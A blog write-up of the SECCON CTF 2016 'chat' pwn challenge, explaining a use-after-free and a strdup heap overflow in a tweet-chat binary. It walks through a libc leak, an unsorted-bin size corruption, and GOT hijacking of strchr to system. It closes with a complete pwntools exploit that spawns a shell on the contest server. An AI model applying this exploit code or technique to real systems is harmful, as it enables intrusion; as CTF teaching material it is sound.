---
title: SECCON CTF 2016 -- chat
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- SECCON
- CTF
- Pwnable
- use_after_free
- heap
- heap_overflow
- Python
categories:
- write-ups
date: '2016-12-12 08:03:00 +0000'
---

**Category:** Exploit
**Points:** 500

<!-- more -->  

64 bit ELF with Partial RELRO, stack canary & NX enabled, No PIE.  

The program is a simple tweet-chat service:
```
$ ./chat
Simple Chat Service

1 : Sign Up     2 : Sign In
0 : Exit
menu > 1
name > userA
Success!

1 : Sign Up     2 : Sign In
0 : Exit
menu > 1
name > userB
Success!

1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userA
Hello, userA!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 5
name >> userB
message >> from a
Done.
```

As we can see the service allow us to sign up users, sign in and tweet message (send public message). We can also DM other users. In the above example, after `userA` send a message to `userB`, we can sign in as `userB` and check the DM:
```
1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userB
Hello, userB!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 2
Direct Messages
[userA] from a
Done.
```
It will print the sender's name and its message. 

Users and messages are stored in the program with two different kinds of data structures:
```c
struct user {
    char *name;
    struct message *msg;
    struct user *next_user;
}

struct message {
    int id ; // use in tweet (public message) only
    struct user *sender;
    char content[128];
    struct message *next_msg;
}
```

Notice that there's some limitations while setting `user->name`: the maximum name length is 32, and **the first character must be a printable character** (check by the [isprint](http://www.cplusplus.com/reference/cctype/isprint/) function). This effects the functionality of the `Change UserName` : If you change a user's name, and the new name isn't a valid user name, **it will remove the user**. 

So what if we remove a user after we send a DM to another user?

```
1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userA
Hello, userA!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 7
name >>            <-- here we input '\t', which did not pass the isprint check
Change name error...
Bye, 

1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userB
Hello, userB!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 2
Direct Messages
[] from a       <-- strange sender's name
Done.
```

We can see that if we show `userB`'s DM after we remove `userA`, the sender's name will become a strange value. This is because while removing `userA`, it will free the `userA->name` pointer, but the program is still able to access the pointer by showing `userB`'s DM **( accessing `userB->messsage->sender->name` )**. A typical Use-After-Free vulnerability.

So now there's a dangling pointer in the program. If we can arrange the heap memory chunk carefully, and make a user's name buffer overlapped with `userB->messsage->sender`:
```

                       +--------------+
userB->message->sender | char *p_name | userC->name
                       |              |
                       +----+---------+
                            |
            +---------------+
            |
            |          +-----------+
            +-> p_name |sender_name|
                       |    .      |
                       |    .      |
                       |    .      |
                       +-----------+

```
We can then modify the value of pointer `p_name` by editing `userC->name`, and then leak some address by viewing `userB`'s DM ( sender's name ). This can be done easily if you're familiar with the glibc malloc's fastbin allocation. By changing `p_name` into `__libc_start_main@got.plt` ( `0x603040`, which its first character is `0x40`, a printable character ), we can then leak the libc's base address. 

Now we still need to find a way to do the "write-anywhere" attack. It's kind of hard to find such vulnerability by just reversing the binary, so I decided to start fuzzing the binary, while examine the heap memory at the same time. Finally ( and luckily ! ), I notice that I've made the heap memory chunk arranged like this:
```

          +--------------+
0x1234050 |              | userC->name
          +--------------+
          |              |
          +--------------+
0x1234060 |              | unsortbin <-- oh yeah
          +--------------+
0x1234068 |          0x21|
          +--------------+
          |     .        |
          |     .        |
          |     .        |
          |     .        |
          |     .        |
0x1234090 |     0x1234050| userC
          |              |
          |              |
          |              |
          +--------------+

```

I found that I can corrupt the header of unsortbin chunk `0x1234060` by overflowing the `userC->name` buffer ! Later I realized that this is because program use `strdup` to allocate the buffer of `userC->name`. If we set the name length of `userC` less than 24, it will allocate a buffer with size `0x20` ( fastbin[0] ) . But when we change a user's name, it allow us to input at most 32 characters, which will overflow the name buffer !

By corrupting the meta data and change the chunk size from `0x21` to `0xa1` ( the size of a `message` structure ), we can allocate a fake chunk (`0x1234060`, size = `0xa1`), and forge the data structure at `0x1234090` ( a `user` structure ), change the `userC->name` pointer from `0x1234050` into another memory address, then we can do the "write-anywhere" attack ( ex. GOT hijacking ) by changing `userC`'s name .  

So to sum up:
1. Overflow `userC->name`, change the unsortbin chunk size into `0xa1`.
2. Post a tweet, this will allocate the memory from unsortbin.
3. Craft the tweet message, forge a fake `user` structure (modify the `userC->name` pointer).
4. Change the name of `userC` to overwrite the memory.  

Looks simple huh? Except it's **not**. To successfully change a user name, **both the old user name and the new user name's first character has to be printable**. For example, if we want to hijack `free`'s GOT:
```
gdb-peda$ tel 0x603010
00:0000|  0x603010 --> 0x7eff900f44a0 (<_dl_runtime_resolve>:   sub    rsp,0x38)
01:0008|  0x603018 --> 0x7eff8fd9bd00 (<__GI___libc_free>:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)
02:0016|  0x603020 --> 0x7eff8fda19b0 (<strlen>:        pxor   xmm8,xmm8)
03:0024|  0x603028 --> 0x4007f6 (<__stack_chk_fail@plt+6>:      push   0x2)
04:0032|  0x603030 --> 0x7eff8fd8b100 (<setbuf>:        mov    edx,0x2000)
05:0040|  0x603038 --> 0x7eff8fd9fd40 (<__strchr_sse2>: movd   xmm1,esi)
06:0048|  0x603040 --> 0x7eff8fd3ae50 (<__libc_start_main>:     push   r14)
07:0056|  0x603048 --> 0x7eff8fd87160 (<_IO_fgets>:     push   r12)
```
We can see that `free`'s GOT ( `0x603018` ) stores the address `0x7eff8fd9bd00`. Its first character is `0x00`, which is not printable, making us unable to change the content of `0x603018`. Even if its first character is printable, the `system`'s offset in the libc is `0x46590` -- another non-printable first character, which will make the program remove (freeing) the user name and crash the program ( for trying to free a GOT entry ). 

So how are we gonna bypass the check? Well it's a little bit tricky, but also very interesting. I notice that the GOT entry of `stack_chk_fail` stores the address `0x4007f6`. Although `0xf6` is non-printable, the third character `0x40` is a printable character. Hmmmm, if only I can make `0x40` to our user name's first character...
```
gdb-peda$ tel 0x60302a
00:0000|  0x60302a --> 0xb100000000000040   <-- printable first character !
01:0008|  0x603032 --> 0xfd4000007eff8fd8 
02:0016|  0x60303a --> 0xae5000007eff8fd9 
03:0024|  0x603042 --> 0x716000007eff8fd3 
04:0032|  0x60304a --> 0x8e0000007eff8fd8 
05:0040|  0x603052 --> 0xd2b000007eff8fe5 
06:0048|  0x60305a --> 0x86600007eff8fd6 
07:0056|  0x603062 --> 0x8e80000000000040
```

That's right ! If we change the `userC->name` pointer into `0x60302a`, we can start overwriting the content from `0x60302a`. We first filled the GOT entry of `stack_chk_fail` with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT ! 

Here I decided to hijack `strchr`'s GOT so when the program call `strchr(buf, 10)` ( `buf` stores our input ) it will call `system(buf)` instead.  
```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "chat.pwn.seccon.jp"
PORT = 26895
ELF_PATH = "./chat"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6" # ubuntu 14.04 64bit

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def signup(name):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", name)

def signin(name):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", name)

def tweet(msg):
    r.sendlineafter(">> ", "4")
    r.sendlineafter(">> ", msg)

def dm(user, msg):
    r.sendlineafter(">> ", "5")
    r.sendlineafter(">> ", user)
    r.sendlineafter(">> ", msg)

def signout():
    r.sendlineafter(">> ", "0")

def change_name(name):
    r.sendlineafter(">> ", "7")
    r.sendlineafter(">> ", name)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    signup("A"*4) # fastbin[0] * 2
    signup("B"*4) # fastbin[0] * 2
    signup("C"*30) # fastbin[0] * 1 + fastbin[1] * 1 

    signin("A"*4)
    tweet("aaaa") 
    signout()

    signin("B"*4)
    tweet("bbbb")
    dm("A"*4, "BA") # for creating dangling pointer
    dm("C"*30, "BC")
    signout()

    signin("C"*30)
    tweet("cccc")
    signout()

    signin("B"*4)
    change_name("\t") # invalid, will remove user (user AAAA's DM become dangling pointer)
    signin("C"*30)
    change_name("\t") 

    signup("d"*7)
    signin("d"*7)
    for i in xrange(6,2,-1): # null out the address
        change_name("d"*i)

    malusr = p64(elf.got['__libc_start_main'])
    change_name(malusr) # AAAA's DM's sender->name will pointer to __libc_start_main@got.plt
    signout()

    # leak libc
    signin("A"*4)
    r.sendlineafter(">> ", "2") # show DM, leak libc
    r.recvuntil("[")
    libc.address += u64(r.recv(6).ljust(8,"\x00")) - libc.symbols['__libc_start_main']
    system_addr = libc.symbols['system']

    log.success("libc base: "+hex(libc.address))
    log.success("system: "+hex(system_addr))
    signout()

    # somehow we can overwrite an unsortbin chunk's size
    # enlarge the size, so we can overflow the heap buffer and fake some data structure
    signin(malusr)
    change_name("i"*24+p8(0xa1))
    tweet("fuck") # will allocate chunk from smallbin
    change_name(p8(0x40)) # make this user into right index
    tweet("7"*16+p64(0x60302a)) # allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a

    # start overwriting, we wish to overwrite strchr's got
    change_name("A"*6+"B"*8+p64(system_addr)) # padding + padding + strchr's got (overwrite to system)
    r.sendlineafter(">> ", "sh\x00") # strchr("sh", 10) --> system("sh")

    r.interactive()

```

First time solving a 500 points pwn challenge ! WOOHOO ! 

flag: `SECCON{51mpl3_ch47_l1k3_7w1*73*}`